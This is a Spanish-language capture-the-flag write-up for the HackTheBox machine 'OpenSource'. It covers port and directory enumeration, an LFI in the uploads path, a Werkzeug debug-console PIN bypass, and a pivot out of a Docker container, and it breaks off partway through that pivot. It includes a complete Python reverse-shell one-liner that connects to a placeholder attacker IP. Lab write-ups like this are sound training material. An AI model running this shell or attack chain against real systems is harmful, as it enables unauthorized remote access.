# OpenSource

![OpenSourcew](https://user-images.githubusercontent.com/97627828/174652864-db0b100b-bf24-4f44-b614-aed5a43e254c.png)

## Initial Enumeration

```
❯ sudo nmap -sS -sV -O -sC -v -p22,80,3000 opensource.htb 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 13:41 EDT
Nmap scan report for opensource.htb (10.10.11.164)
Host is up (0.096s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
```
Comenzaremos interactuando con el puerto 80.

![image](https://user-images.githubusercontent.com/97627828/174655163-f66d3f8c-2586-4b3a-9bba-ebcf6f5a5861.png)

Tras inspeccionar el código fuente de la web se encuentra lo siguiente:
- /download: permite descargar un archivo .ZIP con lo que parece el código fuente de la app que permite la carga de archivos al servidor web.

  ![image](https://user-images.githubusercontent.com/97627828/174656635-94cacc71-e4a9-4998-8a45-6ee78094a71c.png) 
  - Al descargar el archivo source.zip encontramos lo siguiente:

    ![image](https://user-images.githubusercontent.com/97627828/174657965-cac681eb-c08f-4ae3-b77b-884f4fe7d013.png)

- /upcloud: función de carga de archivos al wervidor web.

  ![image](https://user-images.githubusercontent.com/97627828/174657055-234ac1d4-be90-409f-b3c5-5e00dcda9820.png)

- /uploads/nombre-del-archivo-subido (url en la que la página almacena los archivos que se suben, al visitarla se descarga el archivo subido previamente).

  ![image](https://user-images.githubusercontent.com/97627828/174657164-0126a1e7-afbc-4e28-b9c7-d1f150139f74.png)


Para continuar descubriendo directorios, se utiliza "gobuster"
```
❯ sudo gobuster dir -u http://opensource.htb -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt                                                                                                                   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://opensource.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/20 13:57:07 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563] 
```
Llama la atención el directorio /console, no encontrado previamente. Al visitarlo nos encontramos con lo siguiente:

  ![image](https://user-images.githubusercontent.com/97627828/174658439-5c27e163-6fba-4ca5-b959-3ed76f416704.png)

## Primera manera de conseguir user.txt ##

Tras realizar una búsqueda en _San Google_ se encuentra el siguiente repositorio https://github.com/wdahlenburg/werkzeug-debug-console-bypass en donde se indica que los servidores Werkzeug tienen una consola para debugging que exije un PIN para ejecutar comandos y que en caso de encontrar una vulnerabilidad LFI se podría generar un PIN válido y de esta manera ejectutar comandos en el servidor. 

El primer paso es encontrar la LFI, para ello recurro a Burpsuite, dado que los archivos se almacenan en /uploads empezaremos por ahí. Bingo! Existe LFI:

  ![image](https://user-images.githubusercontent.com/97627828/174660689-71d3fa57-afe2-400c-b69c-fefae745ee9c.png)

Siguiendo los pasos indicados en https://github.com/wdahlenburg/werkzeug-debug-console-bypass se consigue obtener un PIN válido para la consola y finalmente se consigue acceso a la consola de python.

  ![image](https://user-images.githubusercontent.com/97627828/174661686-8733597a-5ddc-4ddd-8e84-bf21d0e54688.png)
  ![image](https://user-images.githubusercontent.com/97627828/174662127-bf140d1d-5b40-4f9f-acc4-b5d6bf77edeb.png)

Como se puede visualizar en la imagen, se ejecutan los comandos en la consola python y se obtiene el código de salida de python de cada comando. El siguiente paso es ejecutar una reverse shell en python, para ello pondre un puerto a la escucha con el comando `nc -lvp <puerto>` y utilizaré el comando `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI-IP",KALI-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

Se obtiene así la primera shell, al listar el contenido de la raíz se observa un archivo ".dockerenv"  por lo que se sabe que estamos dentro de un contenedor Docker, lo cual encaja con el hecho de que la shell obtenida sea como usuario root.

Para continuar con el pivoting, tras una larga búsqueda se comprueba que el puerto 3000 inicialmente inaccesible, se encuentra ahora accesible en la ip 172.17.0.1 correspondiente con el host del contenedor docker. 
 ![image](https://user-images.githubusercontent.com/97627828/174666337-481ff02d-d80e-4480-86ca-3f5a4fab8cb1.png)
 ![image](https://user-images.githubusercontent.com/97627828/174666547-fd032f01-cd7a-4442-a582-2433c1ba8052.png)




